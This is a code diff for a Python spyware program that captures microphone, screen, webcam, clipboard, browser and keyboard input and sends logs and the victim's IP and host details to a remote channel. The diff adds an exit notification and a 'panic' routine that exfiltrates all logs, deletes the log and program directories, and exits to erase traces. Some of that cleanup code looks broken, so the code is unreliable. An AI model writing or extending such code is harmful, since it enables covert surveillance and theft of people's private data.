@@ -1,9 +1,11 @@
-import threading
-import time
+import atexit
+import os
 import platform
 import requests
+import threading
+import time
 
-from config import SEND_LOGS_INTERVAL_SEC
+from config import SEND_LOGS_INTERVAL_SEC, LOG_DIRECTORY_PATH
 
 from loggers.browser_logger import BrowserLogger
 from loggers.clipboard_logger import ClipboardLogger
@@ -32,7 +34,7 @@ def send_all_logs(loggers):
 
 
 def create_loggers():
-    loggers = [
+    return [
         MicrophoneLogger(),
         ScreenLogger(),
         WebcamLogger(),
@@ -40,7 +42,6 @@ def create_loggers():
         ClipboardLogger(),
         InputLogger(),
     ]
-    return loggers
 
 
 def start_loggers(loggers):
@@ -54,9 +55,24 @@ def start_loggers(loggers):
 
 def startup_message():
     ip = requests.get("https://checkip.amazonaws.com").text.strip()
-    system_info = platform.uname()
-    message = f"Started logging on {system_info.system} {system_info.release} ({system_info.version}) from {system_info.node} at IP: {ip}"
+    message = f"Started logging on {platform.uname().system} {platform.uname().release} ({platform.uname().version}) from {platform.uname().node} at IP: {ip}"
     send_message(message)
+
+
+def exit_message():
+    send_message(
+        f"Logging stopped from {platform.uname().node}. Logs are available at {LOG_DIRECTORY_PATH}"
+    )
+
+atexit.register(exit_message)
+
+
+def panic():
+    send_message(f"PANIC TRIGGERED FROM {platform.uname().node}!")
+    send_all_logs(create_loggers())
+    os.rmdir(LOG_DIRECTORY_PATH)
+    os.rmdir(os.path.dirname(os.path.realpath(__file__)))
+    os._exit(0)
 
 
 def main():
@@ -73,12 +89,9 @@ def main():
     except KeyboardInterrupt:
         for logger in loggers:
             logger.running = False
-
         for thread in logger_threads:
             thread.join()
-
         send_logs_thread.join()
-
     except Exception as e:
         log_error(e)
         return 1
